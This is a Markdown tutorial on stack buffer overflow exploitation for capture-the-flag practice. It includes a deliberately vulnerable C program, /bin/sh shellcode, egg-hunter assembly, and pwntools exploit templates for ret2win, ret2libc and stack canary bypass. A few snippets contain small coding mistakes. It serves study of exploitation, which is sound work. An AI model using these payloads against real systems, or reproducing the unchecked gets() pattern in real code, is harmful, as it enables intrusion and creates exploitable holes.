# Buffer Overflows

Buffer Overflows are a type of binary exploitation which arise from poor programing practices and memory allocation in memory managed programing languages like C. They are an example of 'mixing data and control'. 

## See Also

##### â€£ [Heap Based](../HeapExploits/HeapExploits.md)

## Recommended Reading

+ [Tooling](../../Tooling/Tooling.md)
+ [Memory Protections](../../Theory/MemoryProtections.md)
+ [Reversing](../../Reversing/Reversing.md)
+ [The Binary Timeline](../../Theory/BinaryTimelines.md)
+ [Virtual Memory](https://devsheets.cybernetic.coffee/os/virtual-memory/)


## The Stack

In general the stack is a part of the region in virtual memory allocated to a program when it is chosen by the scheduler to run. This region is known as the programs address space.

### A Simplified View Of Virtual Memory

+ The bellow diagram represents a programs/processes address space as it appears in virtual memory
+ For a more detailed diagram and explication see [DevSheets Virtual Memory](https://devsheets.cybernetic.coffee/os/virtual-memory/) or [SecSheets VM]()

```
Stack Bottom +------------> +---------------------------------------------------+        +
                            |                                                   |        |
                            |                                                   |        |
                            |                                                   |        |
                            |                   Stack Region                    |        |
                            |                                                   |        |
                            |                                                   |        |     Lower Memory Addresses
                            +------------------------+--------------------------+        |
                            |                        |                          |        |
                            |                        |                          |        |
                            |                        |                          |        |
                            |                        |                          |        |
                            |                        |                          |        |
                            |                        |                          |        |
                            |                        v                          |        v
Stack Top    +----------->  +---------------------------------------------------+
                            |                                                   |
                            |                                                   |
                            |                  Shared Libraries                 |
                            |                                                   |
                            |                                                   |
                            +---------------------------------------------------+        ^
                            |                        ^                          |        |
                            |                        |                          |        |
                            |                        |                          |        |
                            |                        |                          |        |
                            |                        |                          |        |
                            |                        |                          |        |
                            |                        |                          |        |
                            |                        |                          |        |
                            +------------------------+--------------------------+        |     Higher Memory Addresses
                            |                                                   |        |
                            |                                                   |        |
                            |                   Heap Region                     |        |
                            |                                                   |        |
                            |                                                   |        |
                            +---------------------------------------------------+        +
                            |                                                   |
                            |                      Data                         |
                            |                                                   |
                            +---------------------------------------------------+
                            |                                                   |
                            |                                                   |
                            |                                                   |
                            |                                                   |
                            |                      Text                         |
                            |                                                   |
                            |                                                   |
                            |                                                   |
                            |                                                   |
                            +---------------------------------------------------+

```

### Stack Growth

+ Indeed the stack does not grow sideways, but thinking about how the stack grows relative to the processes address space and the heap can be confusing

+ It has in fact been claimed that inverting the direction the stack grows in could be a mitigation to stack based buffer overflows
    + Unfortunately not a meme

+ The important thing to remember is that **conventionally** the stack grows **down in address value**
    + The more we `push` to the stack the **lower** the address that the stack pointer points to (`esp | rsp`)
    + The more we `pop` from the stack the **higher** the address that the stack pointer points to

+ We think of the **top** of the stack as **lowest** address of the stack region in [vm](https://devsheets.cybernetic.coffee/os/virtual-memory/)
+ Thus the **bottom** of the stack is its **highest** address in the stack region
+ It is important to note that **this is not always the case** 
+ Sadly it is just as confusing to flip the logic above in the case of a stack that grows up


## Key x86 Stack Registers 

+ When working on the stack, and overwriting data on it, it is useful to know about a few key registers 
+ These are the registers you will interact with frequently as you smash the stack
+ What the f*ck is an x86?
    + Basically the overarching **instruction set architecture** (now x86-64) used on most modern systems
    + Instruction set = things the cpu can beep boop = spicy integers 
+ A little history ...
    + Computers got smaller
    + But other things got bigger
    + Like the size of instructions
    + Hence our ancient friends the x86 16bit instructions were extended
    + This was the birth of x86 32bit instruction set with `E` prefix registers
    + Now instructions got more chonk --> x86 64bit instructions
    + Programmers couldn't think of another letter to mean extended-extended again so they used a **r**??

### x86-32

+ **eax:** Conventionally (compiler based) stores the address of the return from a function call
+ **esp:** Extended Stack Pointer, points to the most recent data on the stack
+ **ebp:** Extended Base Pointer, points to the bottom of the stack region
+ **eip:** Extended Instruction Pointer, points to the current instruction to be executed in the program



### x86-64

+ **rax:** Conventionally (compiler based) stores the address of the return from a function call
+ **rsp:** Stack Pointer, points to the most recent data on the stack
+ **rbp:** Base Pointer, points to the bottom of the stack region
+ **rip:** Instruction Pointer, points to the current instruction to be executed in the program

## Ret2win

+ Ret2win refers to the tactic or idea of returning to a 'win' function
+ In most cases this 'win' function is artificial subroutine introduced by the challenge creator to reduce the difficulty of exploiting the binary
+ In exceptionally rare cases the 'win' function could be a real function within a legitimate/real binary in the wild which houses code which gives the exploiter control
    + For example a function which pops a shell for some reason, or reads a protected file


### Example

+ Consider the following C sauce

```c

#include <stdio.h>
#include <stdlib.h>
#include <strings.h>
#include <time.h>

void win() {
    printf("Herin sleeps the shell\n");
    system("/bin/sh");
}


int guess = 0;

int main(){
	srand(time(NULL));
	char input[10];
	int random = (rand() % (126-32)) + 32;

	printf("Can you guess what number I'm thinking of?\n");

	fgets(input,10,stdin);
	if(!strchr(input, '\n')){
		while(fgetc(stdin)!='\n');
	}

	guess = atoi(input);
	if (guess != random){
		printf("WRONG!!!\nThe number was: %d\n",random);
		printf("Do you want me to check your answer again? y\\n \n");

		gets(input); // gEts bRuH <----------------------------------- ðŸ‘€ðŸ‘€ðŸ‘€

		if(input[0] != 'y'){
			return 0;
		}

		if (guess == random) {
			printf("You still lose...\n");
		}
	}

    return 0;
}


```

+ Note if we didn't have the source code the compiled binaries [disassembly](/todo/tooling) resembles the following

```c


////////////////////////////////////////////// WIN \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\

void win(void)
{
    int32_t unaff_EBX;
    int32_t var_4h;
    
    __x86.get_pc_thunk.bx();
    puts(unaff_EBX + 0xcee);
    system(unaff_EBX + 0xd05);
    return;
}

////////////////////////////////////////////// MAIN \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\


undefined4 main(void)
{
    undefined4 uVar1;
    int32_t iVar2;
    int32_t unaff_EBX;
    char *str;
    uint32_t var_8h;
    int32_t var_4h;
    undefined4 random;
    
    __x86.get_pc_thunk.bx();
    uVar1 = time(0);
    srand(uVar1);
    iVar2 = rand();
    var_8h = iVar2 % 0x5e + 0x20;
    puts(unaff_EBX + 0xcd4);
    fgets(&str, 10, **(undefined4 **)(unaff_EBX + 0x2ca0));
    iVar2 = strchr(&str, 10);
    if (iVar2 == 0) {
        do {
            iVar2 = fgetc(**(undefined4 **)(unaff_EBX + 0x2ca0));
        } while (iVar2 != 10);
    }
    uVar1 = atoi(&str);
    *(undefined4 *)(unaff_EBX + 0x2cb8) = uVar1;
    if (var_8h != *(uint32_t *)(unaff_EBX + 0x2cb8)) {
        .plt.sec(unaff_EBX + 0xcff, var_8h);
        puts(unaff_EBX + 0xd1c);
        gets(&str);
        if (((char)str == 'y') && (var_8h == *(uint32_t *)(unaff_EBX + 0x2cb8))) {
            puts(unaff_EBX + 0xd4c);
        }
    }
    return 0;
}


```

+ We can see that if we could reach the win function we will be able pop a shell (which is great for us)
+ However nowhere in the code is win called ðŸ¤”
+ So how can we get there ??
+ In the second if block in main

```c

*(undefined4 *)(unaff_EBX + 0x2cb8) = uVar1;
if (var_8h != *(uint32_t *)(unaff_EBX + 0x2cb8)) {
    .plt.sec(unaff_EBX + 0xcff, var_8h);
    puts(unaff_EBX + 0xd1c);
    gets(&str);

    // <-- ... -->

```

+ We see the fastest way to end your development career with a `gets(&str)` function call
+ `gets()` is a dangerous function, why, because it is unguarded
+ Any number of bytes can walk straight through the buffers stack allocation and out onto the rest of the programs stack region
    + With the source code we can see that the buffer `input[10]` is allocated 10 bytes of memory on the stack 
    + This means that any string longer than 9 characters provided as input to the running binary will overflow the buffer and the extra bytes will overwrite the preceding data on the stack
+ But how far do we go? Why? Where?

### The Return Pointer

+ At the end of every function there is a return instruction
+ In x86 the following are valid return instructions
    + `ret`
    + `retn`
        + A return to a calling procedure within the current code segment
    + `retf`
        +  A return to a calling procedure located in a different segment than the current code segment
+ Note the `ret` instruction is a pseudo instruction which will be translated contextually into either a `retn` or `retf` instruction
+ When `ret` is called the program attempts to transfer control to the instructions on the call stack pointed to by the return address
+ Typically when we overrun a buffer with enough bytes we will eventually overwrite the address return points to
+ From here a few things could occur:
    + The overwritten address now probably points to some garbage bytes from your cyclic pattern or perhaps a bunch of `\x61` bytes which are not likely to form a valid location in the programs memory causing a **SEGFAULT** to occur as the program attempts to jump to invalid memory
    + The second thing that can happen is the return pointer is overwritten with a valid location in the programs memory and can return to that segment and continue execution
+ Our goal is to control this return pointer and overwrite it with a memory address of our choosing 
+ If we can control the return pointer than we can control the flow of execution and ultimately execute instructions of our choosing
+ In the case of ret2win however we simply want to overwrite the return pointer with the address of the win function thus transferring the flow of execution there and executing whatever instructions lie within

### Sample Exploit

+ Bellow is an example exploit using [pwntools](../../../Tooling/Tooling.md) for exploiting a ret2win buffer overflow

```python
from pwn import *

r = remote('<domain>', <port>)
# r = process('./<binary>')

padding = b'A' * cyclic_find(b'aala')

#                   E.G   0x80484d6
payload = padding + p32(<win-address>)

r.sendline(payload)

r.interactive()

```

## Ret2shellcode

+ Now that we have seen the general approach to buffer overflows and explored the notion of controlling the return pointer we can now talk about what to do if we do not have a win function to return to

### Shellcode

+ Shellcode is the name given to chaining opcodes together in a payload to, historically, pop a shell
+ A typical chunk of shellcode looks like `
"\xeb\x17\x5b\x31\xc0\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\x50\x8d"
"\x53\x08\x52\x53\xb0\x3b\x50\xcd\x80\xe8\xe4\xff\xff\xff/bin/sh"`
+ However we live in the modern era and there exists the [pwntools]() library
+ With pwntools we can build our shellcode in x86, this typically looks something like

    ```python
    shellcode = asm('''
        xor eax, eax
        push eax     

        push 0x68732f2f   
        push 0x6e69622f 

        mov ebx, esp   
        push eax

        push ebx
        mov ecx, esp
        mov al, 0xb     

        int 0x80
    ''')
    ```
+ For more on writing custom shellcode see [shellcoding](../../../Theory/Shellcoding.md)
+ We can craft our own shellcode or use some great ones from [shell-storm](shell-storm.org/shellcode) to essentially do whatever we want
+ If we can now redirect the execution of a program to the start of our shellcode then we can also force the program to do whatever our shellcode instructs
+ But how do we return to or execute our shellcode?

### Locating The Shellcode

+ In scenarios without ASLR and other [memory protections](../../../Theory/MemoryProtections.md) we can simply [reverse](../../../Reversing/Reversing.md) the binary to work out the offset from the return pointer to our buffer and hardcode that address
+ In other cases we may have a large buffer that we control and can place a nopsled into the buffer and then guess a random offset that hopefully points somewhere into our nopsled, see [circumventing memory protections](#circumventing-memory-protections)
+ In further cases still we may be able to leak and address, with say a [format string](../../../Format%20Strings/Format%20Strings.md), or we may be provided with one
    + In this case we use the address to calculate offsets to our shellcode buffer


### Debugging Shellcode


+ To test if a exploit payload is working and jumping to the start of the shellcode a breakpoint or 'SIGTRAP' opcode can be propended to the shellcode
+ This will cause an attached debugger like GDB to pause at the start of the shellcode, or wherever the `\xcc` opcode is placed, for analysis
+ Opcode `"\xcc"`
+ x86 ASM `int3`


## Ret2libc

+ Ret2libc refers to the tactic of crafting a overflow exploit in the face of [mitigations](../../../Theory/MemoryProtections.md), namely NX, that prevent execution on the stack by 'living off the land'
+ In this case living off the land refers to utilizing strings and functions which exist within standard C libraries  
+ But wait, why do we have access to so much of the standard C libraries even though our program only uses a small subset of these ?

### Shared Libraries

+ A shared library is a library that is used by a program but is not statically bound to it at compellation time (that is a static library) 
+ This means that the library that the program wishes too use is loaded into its address space (virtual memory) at runtime (aka when it is selected by the scheduler)
+ This is done as an optimization to reduce memory usage and paging/swapping frequency 
+ You may [recall](https://devsheets.cybernetic.coffee/os/virtual-memory/) that in a virtual memory environment many programs can reference the same physical page where shared libraries are stored 

+ The addresses of shared libraries, including libc of course, can be obtained with `ldd`

`ldd <binary>`

+ So now we have the address where libc starts, but what can we actually do with this ?
+ First lets talk about where we will return


#### Useful Functions

+ libc contains a plethora of functions we could return to  
+ Normally a shell is the ultimate goal
+ At some point I will extend this list but for now I will just talk about **system**

**shell/process**

+ `system("/bin/sh")`

**Retrieving the functions address**

+ We can use gdb to print the address of our desired function in libc with

`pwndbg> p <function>`

+ If we simply overwrite the return pointer with this address however, nothing useful will happen
+ Why?

#### Imitating The Call Stack

+ The issue is that the operating system, or perhaps more accurately the CPU, expects the call stack to appear in a certain way and order
+ To understand this lets look at what the disassembly for a call to `system("/bin/bash")` looks like

**disassembly**

![Disassembly Call Stack System](https://user-images.githubusercontent.com/44337835/120813811-9a9f6800-c591-11eb-8af4-8944559ca2df.png)

+ We see that the compiled code moves the string "/bin/bash" stored at 0x2004 onto the stack just before calling system

![Pushing Bin Bash String to Stack](https://user-images.githubusercontent.com/44337835/120814468-3f21aa00-c592-11eb-91be-3d06e1407a46.png)

+ Without this the program would not be able to execute the system function call with the `"/bin/bash"` argument

**Debugging Trace**

![System Call Stack](https://user-images.githubusercontent.com/44337835/120811787-b4d84680-c58f-11eb-8856-98529e388b89.png)

+ Therefore to make our return to `system` work we must imitate this call stack
    + Note for a simple case like this were we wish to return a shell, essentially a function that should never return, we ignore imitating the moving of the functions (`system`) return address to the stack
+ We have control of the stack so it is possible for us to overwrite memory addresses on the stack with our own
+ But how can we make our `"/bin/sh"` string appear on the stack just before our call to `system`?

#### Finding a Useful Reference 

+ When talking about a reference we refer to a useful string that we may incorporate into our system call
+ Such strings are like
    + `"/bin/sh"`
    + `"/bin/bash"`
    + `"/bin/zsh"`
    + `"/bin/fish"`
+ There are a few ways to get such references
    + Environment variables
    + Existing Stack Address
    + libc
+ We hope to find a reference to such strings in libc as it is the most reliable of the methods
+ To do so we can use strings with a grep pipe

`strings strings -a -t x /lib/<path-to-libc> | grep "/bin/sh"`

+ This should return an address in hex which we can add to the start of libcs address range in its address space
+ The starting address of libc in the processes memory can be obtained with gdb as follows

`pwndbg> info proc map`

+ Taking the first address for libc to appear in the list as the address
+ Confirm that this reference does indeed lead to the reference with

`pwndbg> x/s <libc-hex-address> + <reference address>`

+ Now lets look at how we inject this payload into the running binary

##### Writing The Exploit With Pwntools

+ Implementing the above approaches we obtain an exploit script similar to the following
+ Note replace all `<...>` with appropriate values from above

```python

from pwn import *

## Assumes x86-32

proc_s = process('./<binary>')                                    # <-- Replace with your binary

padding = b'<padding/offset-bytes>'
system_address = p32(<0xsystem-address>)
eax_system = b'AAAA'                                              # <-- Dummy Function Return Pointer
bin_reference = p32(<0xlibc-offset-reference>)                    # <-- libc address of reference 

payload = padding + system_address + eax_system + bin_reference

# <-- Insert recvlines() as needed -->
proc_s.sendline(payload)
proc_s.interactive()

```

##### Automating The Process

+ In the above way we used a variety of tools and methods to determine locations of reference strings, function calls and offsets 
+ While this is useful because it helps us understand each step, pwntools can do **alot** of this for us
+ Note finding the address of libc on a remote system can be harder, here we assume remote is the same
as our local libc

```python
from pwn import *

proc_s = process('./<binary>')  

padding = b'<padding/offset-bytes>'                     # <-- overflow to just before return pointer

libc = ELF('libc-2.27.so')                              # <-- path to libc (remote (provided locally)/local)

p.recvlines(<lines>)                                    # <-- receive any banner messages

system_address = p32(<address-of-system>)               # <-- could be any address in libc, just need an offset
eax_system = b'AAAA'                                    # <-- Dummy Function Return Pointer

libc.address = system_address - libc.symbols['system']  # <-- Base of libc

bin_sh = p32(libc.search('/bin/sh').next())


payload = padding + system_address + eax_system + bin_sh

p.sendline(payload)
p.interactive()

```

## Egg Hunters

+ An egg hunter is a stack based buffer overflow strategy that allows execution of useful shellcode in a environment where the vulnerable buffer is too small to place enough shellcode to pop a shell

### Environmental Conditions

+ To utilise a egg hunter approach we need the following conditions to be satisfied
    + One one or more larger buffers that we can place shellcode into but cannot overflow (due to proper use of APIs or similar)
    + A smaller vulnerable buffer that we control
    + The size of memory pages or a leaked stack address

### Approach

+ The concept now is to place a small shellcode payload into the small vulnerable buffer that searches for the main shellcode in the larger non vulnerable buffer
+ But how do we search for this larger buffer and how do we know when we've found it?

### The Egg Hunter

+ To begin with we decide on a 'unique' string of bytes that we will use as a signature to search for
    + This 'unique' string will be placed at the beginning of the main shellcode
+ It is not possible to guarantee that the chosen string will only appear once on the stack and thus the search may occasionally return false positives 
+ The shellcode for the hunter uses a neat x86 instruction called [scasd](https://c9x.me/x86/html/file_module_x86_id_287.html) 
+ Once we locate our signature we jump there and execute our main shellcode

```python
# Shellcode for egghunter with leaked stack address
# Signature : 0x42424242
egghunt_shellcode = asm(f'''
	mov eax, 0x42424242
	mov edi, {stack_base_address}
	next_addr:
		scasd
		jnz next_addr
	
	jmp edi
''')
```

+ Without a leaked stack address (from which to calculate the stack_base) we can search each of the processes pages withing its address space
+ Attempting to read some of these may result in faults being triggered so we need a way to test that we can read a particular page
+ We also need the page size in order to calculate a range to search, this could be brute forced in the face of an unknown system

```python
# Ref:         https://mosunit.com
# Signature : 0x42424242
egghunt_shellcode = asm('''
    global _start
    section .text
    _start:
            xor edx, edx            
    align_page:
            or dx, 0xffff          
    traverse_page:
            inc edx                 
    ; access syscall
            lea ebx, [edx + 4]      
            push byte 0x21          
            pop eax                 
            int 0x80
    ; validate memory address
            cmp al, 0xf2            
            jz align_page           
    ; search egg
            mov eax, 0x42424242     
            mov edi, edx            
            scasd                   
            jnz traverse_page       
            scasd                   
            jnz traverse_page       
    ; jump to shellcode
            jmp edi             
''')
```

### The Egg

+ The 'egg' itself is simply a useful shellcode payload which we propend with our chosen 'unique' signature 

```python
# Repeat signature 2x for better luck
main_shellcode = p32(0x42424242)
main_shellcode += p32(0x42424242)

# /bin/sh
main_shellcode += asm('''
    xor eax, eax
    push eax     

    push 0x68732f2f   
    push 0x6e69622f 

    mov ebx, esp   
    push eax

    push ebx
    mov ecx, esp
    mov al, 0xb     

    int 0x80
''')
```

## Circumventing Memory Protections

+ For a more highlevel overview of what these memory protections do and how they affect exploitation see [memory protections](../../../Theory/MemoryProtections.md)

### Stack Canaries

+ If a custom canary is in place we can usually circumvent it in one of two ways
    + Bruteforce its value: if the binary is not available locally and/or the canary is generated at runtime 'randomly'
    + Leak its value: by reversing the binary if the canary is static in memory or via a [format string exploit](../../../Format%20Strings/Format%20Strings.md)
+ If we can do this then we need only overwrite the stack canary with the correct value in our payload and then replace the return pointer with one of our choosing

#### Example Circumventing A Custom Canary Given Binary

```python
r = process('./<binary>')

##############################################################################
'''

check_canary <-- main

    |
    |
    V

--> char *s
--> char *s1                        <-- W.T.B >> '1234' 
--> gets (s);
--> eax = strncmp (s1, "1234", 4);  <-- if s1[:b'4'] == '1234' = 0 -> win
--> gets(s)                         <-- overrun s to modify s1 

'''
##############################################################################

s1 = b'1234'            # identified / leaked canary
padding = b'A' * 141
payload = padding + s1  # <-- '1234'

r.sendline(payload)
r.interactive()
```
#### GCC Like Stack Canaries

+ Given a compiler implemented stack canary like that of GCC only two options are really available 
    + Bruteforce/Guess: Feasible on 32bit systems, much harder on 64bit architectures 
    + Leak: Some function that prints stack address values, [format string exploits](../../../Format%20Strings/Format%20Strings.md)

+ If we can do this then we need only overwrite the stack canary with the correct value in our payload on the way past and then replace the return pointer with one of our choosing

```python
# example given memory leak function (a) and a win function
 proc = process('./<binary>)

CANARY_OFFSET = <calculated-offset>

print(proc.recvuntil('stack pointer '))

stack_ptr = proc.recvuntil('\n').strip(b'\n')
packed_stack_ptr = p32(int(stack_ptr, 16) + CANARY_OFFSET)
print(stack_ptr)
print(packed_stack_ptr)


'''

>-> We now need to leak the value stored at the canary's address
>-> In this case the binary provides us with a way to do this using opt b

'''

# feed it the address into buf
proc.sendline('a')
proc.recvuntil('len: ')
proc.sendline(packed_stack_ptr)

# yank the value
proc.recvuntil('quit\n')
proc.sendline('b')
proc.recvuntil(': ') # gtg
canary_value = proc.recv(4) # recive 4 bytes


# unpack the addr 
canary_value = p32(u32(canary_value))
print(f"CAN VAL :: {canary_value}")

proc.sendline('a')

proc.recvuntil('len:')

'''
>-> cyclic output yeilds 108 offset
'''

## SOMEWHERE HERE WE WANT TO OVERWRITE THE STACK COOKIE WITH THE RIGHT VALUE
## SINCE OUR PADDING WOULD DAMAGE IT ON THE WAY PAST OTHERWISE
padding = b'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaa'

# Overwrite ECX with the cookie on the way past, zooom woosh
cooked = canary_value 
pad_to_eip = b'a' * 8

## Hard code win from disassembly
eip_to_win = p32(<win_addr>)

payload = padding + cooked + pad_to_eip + eip_to_win + b'\x90'

proc.sendline(payload)
print(proc.recvuntil('quit\n'))

# Trigger our ret call
proc.sendline('d')

# Catch shell
proc.interactive()

```

### ASLR

+ ~

### PIE

+ ~

### NX

+ ~

### RELRO

+ ~